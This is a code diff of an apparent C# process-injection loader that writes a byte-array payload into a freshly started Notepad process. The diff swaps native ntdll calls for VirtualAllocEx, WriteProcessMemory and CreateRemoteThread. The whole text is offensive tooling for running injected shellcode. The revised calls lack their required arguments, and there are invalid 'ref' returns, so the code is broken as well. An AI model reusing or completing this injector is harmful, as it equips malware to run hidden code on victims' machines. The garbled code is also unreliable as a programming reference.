@@ -7,45 +7,18 @@ namespace gigas;
 public class ProcInj
 {
 
-    [DllImport("ntdll.dll", SetLastError=true, ExactSpelling=true)]
-    static extern IntPtr NtAllocateVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, uint ZeroBits,
-        IntPtr RegionSize, uint AllocationType, uint Protect);
+    [DllImport("kernel32.dll", SetLastError=true, ExactSpelling=true)]
+    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
+        IntPtr dwSize, uint flAllocationType, uint flProtect);
 
 
-    [DllImport("ntdll.dll", SetLastError = true)]
-    static extern bool NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, uint ZeroBits, byte[] Buffer, uint BufferSize,
-        out UIntPtr NumberOfBytesWritten);
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize,
+        out UIntPtr lpNumberOfBytesWritten);
 
-    [DllImport("ntdll.dll")]
-    static extern IntPtr NtCreateThreadEx(
-        
-        uint DesiredAccess,               // ACCESS_MASK DesiredAccess
-        IntPtr ObjectAttributes,          // POBJECT_ATTRIBUTES ObjectAttributes
-        IntPtr ProcessHandle,             // HANDLE ProcessHandle
-        IntPtr StartRoutine,              // PVOID StartRoutine
-        IntPtr Argument,                  // PVOID Argument
-        bool CreateSuspended,             // ULONG CreateFlags
-        IntPtr ZeroBits,                  // SIZE_T ZeroBits
-        IntPtr StackSize,                 // SIZE_T StackSize
-        IntPtr MaximumStackSize,          // SIZE_T MaximumStackSize
-        IntPtr AttributeList              // PVOID AttributeList
-    );
-    
-    // todo: finish switching out this silly ass call 
-    /*
-     *NtCreateThreadEx(
-       _Out_ PHANDLE ThreadHandle,
-       _In_ ACCESS_MASK DesiredAccess,
-       _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
-       _In_ HANDLE ProcessHandle,
-       _In_ PUSER_THREAD_START_ROUTINE StartRoutine,
-       _In_opt_ PVOID Argument,
-       _In_ ULONG CreateFlags, // THREAD_CREATE_FLAGS_*
-       _In_ SIZE_T ZeroBits,
-       _In_ SIZE_T StackSize,
-       _In_ SIZE_T MaximumStackSize,
-       _In_opt_ PPS_ATTRIBUTE_LIST AttributeList
-     */
+    [DllImport("kernel32.dll")]
+    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize,
+        IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
 
     public static readonly byte[] Buf = new byte[]
     {
@@ -85,7 +58,7 @@ public class ProcInj
 
     {
 
-        int inject = NotepadStart();
+        int inject = ref NotepadStart();
         if (inject == 1)
         {
             Console.WriteLine("process injection complete");
@@ -121,7 +94,7 @@ public class ProcInj
             exitCode = proc.ExitCode;
         }
 
-        return exitCode;
+        return ref exitCode;
     }
 
     private static void Injector()
@@ -138,14 +111,11 @@ public class ProcInj
 
     static bool UnsfInj(IntPtr h)
     {
-        IntPtr memAlloc = NtAllocateVirtualMemory(h, IntPtr.Zero, 0,Buf.Length, 0x00001000, 0x40);
+        IntPtr memAlloc = VirtualAllocEx(Buf.Length);
 
-        UIntPtr outout;
-        NtWriteVirtualMemory(h, memAlloc , 0, Buf, (uint)(Buf.Length), out outout);		
-        
+        WriteProcessMemory();
 
-        if (NtCreateThreadEx(0x1FFFFF, IntPtr.Zero, h, memAlloc, IntPtr.Zero, false, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero) != IntPtr.Zero)
-
+        if (CreateRemoteThread())
         {
             Console.Write("injection complete!");
             return true;
